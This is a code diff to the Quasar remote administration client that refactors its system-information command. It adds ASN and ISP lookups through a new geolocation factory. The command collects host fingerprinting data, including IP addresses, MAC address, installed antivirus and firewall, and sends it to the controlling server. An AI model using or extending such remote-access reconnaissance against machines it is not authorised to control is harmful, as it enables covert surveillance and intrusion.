@@ -9,6 +9,7 @@ using Microsoft.Win32;
 using Quasar.Client.Config;
 using Quasar.Client.Data;
 using Quasar.Client.Extensions;
+using Quasar.Client.IpGeoLocation;
 using Quasar.Client.Helper;
 using Quasar.Client.Utilities;
 using Quasar.Common.Enums;
@@ -355,6 +356,8 @@ namespace Quasar.Client.Commands
                 var domainName = (!string.IsNullOrEmpty(properties.DomainName)) ? properties.DomainName : "-";
                 var hostName = (!string.IsNullOrEmpty(properties.HostName)) ? properties.HostName : "-";
 
+                var geoInfo = GeoInformationFactory.GetGeoInformation();
+
                 List<Tuple<string, string>> lstInfos = new List<Tuple<string, string>>
                 {
                     new Tuple<string, string>("Processor (CPU)", DevicesHelper.GetCpuName()),
@@ -369,12 +372,13 @@ namespace Quasar.Client.Commands
                     new Tuple<string, string>("Uptime", SystemHelper.GetUptime()),
                     new Tuple<string, string>("MAC Address", DevicesHelper.GetMacAddress()),
                     new Tuple<string, string>("LAN IP Address", DevicesHelper.GetLanIp()),
-                    new Tuple<string, string>("WAN IP Address", GeoLocationHelper.GeoInfo.Ip),
+                    new Tuple<string, string>("WAN IP Address", geoInfo.IpAddress),
+                    new Tuple<string, string>("ASN", geoInfo.Asn),
+                    new Tuple<string, string>("ISP", geoInfo.Isp),
                     new Tuple<string, string>("Antivirus", SystemHelper.GetAntivirus()),
                     new Tuple<string, string>("Firewall", SystemHelper.GetFirewall()),
-                    new Tuple<string, string>("Time Zone", GeoLocationHelper.GeoInfo.Timezone),
-                    new Tuple<string, string>("Country", GeoLocationHelper.GeoInfo.Country),
-                    new Tuple<string, string>("ISP", GeoLocationHelper.GeoInfo.Isp)
+                    new Tuple<string, string>("Time Zone", geoInfo.Timezone),
+                    new Tuple<string, string>("Country", geoInfo.Country)
                 };
 
                 client.Send(new GetSystemInfoResponse {SystemInfos = lstInfos});
